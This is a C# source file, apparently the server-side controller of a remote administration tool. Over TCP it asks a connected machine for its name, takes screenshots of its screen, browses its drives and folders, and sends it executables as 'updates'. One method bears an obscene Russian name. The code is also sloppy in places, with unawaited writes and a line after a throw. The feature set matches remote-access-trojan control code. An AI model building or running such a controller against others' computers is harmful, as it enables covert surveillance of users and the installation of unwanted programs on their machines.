using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace server
{
    public class Client : IDisposable
    {
        public static int counter = 0;
        public NetworkStream s;
        public Bitmap screen;
        public bool isSuccefullUpdate = false;
        public string exeptionString = "";
        private string name;
        public string Name
        {
            get
            {
                return name;
            }
            private set
            {
                name = value;
            }
        }

        public Client(TcpClient c)
        {
            s = c.GetStream();
            s.ReadTimeout = 10000;
            s.WriteTimeout = 10000;
            Name = "default";
            
        }

        public void Dispose()
        {
            s.Dispose();
        }

        async Task<string> ReadFromStreamAsync()
        {
            //READ
            var buffer = new byte[4096];
        //    Console.WriteLine("[Server] Reading from client");
            var byteCount = await s.ReadAsync(buffer, 0, buffer.Length);
            string result = Encoding.UTF8.GetString(buffer, 0, byteCount);

            return result;
        }

        async Task WriteToStreamAsync(string str)
        {
            //WRITE
            var buffer = new byte[4096];

            if (str == null || str == "")
            {
                throw new Exception("WriteStream has empty input string");
            }
            byte[] strByte = Encoding.UTF8.GetBytes(str);
            try
            {
                await s.WriteAsync(strByte, 0, strByte.Length);
            }
            catch (Exception ex)
            {
                throw new Exception("WRITE " + ex.Message);
            }
        }

        

      

        public async Task GetName()
        {
            try
            {
                WriteToStreamAsync("1");
                Name = await ReadFromStreamAsync();
            }
            catch (Exception ex)
            {
                throw new Exception("method GetName |" + ex.Message);
            }
        }
        public async Task TobiPizda()
        {
            
                WriteToStreamAsync("TobiPizda");
                Name = await ReadFromStreamAsync();
          
        }

       
        public async Task GetScreenshot()
        {
            //Thread.Sleep(3000);
            try
            {
                await WriteToStreamAsync("GetScreenshot");
                int imgBytesCount;
                if (Int32.TryParse(await ReadFromStreamAsync(), out imgBytesCount))
                {
                  //  await WriteToStreamAsync(imgBytesCount.ToString());
                    byte[] imgBytes = new byte[imgBytesCount];
                    var byteCount = await s.ReadAsync(imgBytes, 0, imgBytesCount);
                    Bitmap res = ConvertToBitmap(imgBytes);
                    screen = res;
                   // res.Save(@"C:\printscreen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                }
            
            }
            catch (Exception ex)
            {
                throw new Exception("GetScreenshot" + ex.Message);
            }
        }

        private byte[] ConvertToByte(Bitmap bmp)
        {
            MemoryStream memoryStream = new MemoryStream();
            // Конвертируем в массив байтов с сжатием Jpeg
            bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            return memoryStream.ToArray();
            
        }

        private Bitmap ConvertToBitmap(byte[] bytes)
        {
            MemoryStream memoryStream = new MemoryStream(bytes);

            System.Drawing.Bitmap bmp =
                (System.Drawing.Bitmap)System.Drawing.Bitmap.FromStream(memoryStream);
            // Конвертируем картинку в .png, потомучто Texture2D ест только его
            memoryStream = new MemoryStream();
            bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
            memoryStream.Close();
            // Получаем из потока Texture2D
            return bmp;
        }


        public async Task NewVersion(string newFile)
        {
            using (FileStream stream = new FileStream(Directory.GetCurrentDirectory() + @"/" + newFile + @".exe", FileMode.Open, FileAccess.Read))
            {
                try
                {
                    BinaryReader f = new BinaryReader(stream);
                    long bufLength = stream.Length;
                    if (bufLength > int.MaxValue)
                    {
                        throw new Exception("UpdateApplication: file larger than int32");
                    }
                    else
                    {
                        byte[] buf = new byte[bufLength];
                        f.Read(buf, 0, (int)bufLength);
                        await WriteToStreamAsync("NewVersion".ToString());
                        Thread.Sleep(20);
                        await WriteToStreamAsync(newFile);
                        await s.FlushAsync();
                        Thread.Sleep(50);
                        await WriteToStreamAsync(buf.Length.ToString());
                        Thread.Sleep(150);
                        await s.WriteAsync(buf, 0, buf.Length);
                        string ClientUpdateLenght = await ReadFromStreamAsync();
                        FileInfo fi = new FileInfo(Directory.GetCurrentDirectory() + @"/" + newFile + ".exe");
                        int size = (int)fi.Length;
                        if (Int32.Parse(ClientUpdateLenght) == size)
                            isSuccefullUpdate = true;
                        s.Flush();
                    }
                }
                catch (Exception ex)
                {
                    throw new Exception(ex.Message);
                    exeptionString = ex.Message;
                }

            }

        }
        public async Task<string[]> GetFolderContent(string folderName)
        {
            await WriteToStreamAsync(folderName);
            string receivedString = await ReadFromStreamAsync();

            return receivedString.Split('\n');
        }

        public async void EndFileExplorer()
        {
            await WriteToStreamAsync("End");
        }

      
        public async Task<string[]> FileExplorerToRoot()
        {
            await WriteToStreamAsync("ToRoot");

            string receivedString = await ReadFromStreamAsync();

            return receivedString.Split('\n');
        }

        public async Task<string[]> GetLocalDrives()
        {
            await WriteToStreamAsync("FilesExplorer");
            string receivedString = await ReadFromStreamAsync();

            return receivedString.Split('\n');
        }

        public async Task UpdateApplication()
        {
            WriteToStreamAsync("UpdateApplication");
        }

        public override string ToString()
        {
            return Name;
        }


    }
    
}
